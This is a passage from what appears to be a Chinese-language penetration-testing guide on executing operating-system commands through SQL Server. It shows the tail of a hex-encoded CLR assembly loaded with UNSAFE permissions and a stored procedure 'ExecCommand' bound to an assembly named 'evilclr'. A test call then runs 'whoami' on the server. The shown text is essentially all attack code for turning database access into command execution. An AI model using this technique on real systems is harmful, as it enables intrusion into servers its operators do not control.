00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000503C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    WITH PERMISSION_SET = UNSAFE;
go
;创建存储过程
CREATE PROCEDURE [dbo].[ExecCommand]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [evilclr].[StoredProcedures].[ExecCommand]
go
;执行命令
exec dbo.execcommand 'whoami'
```

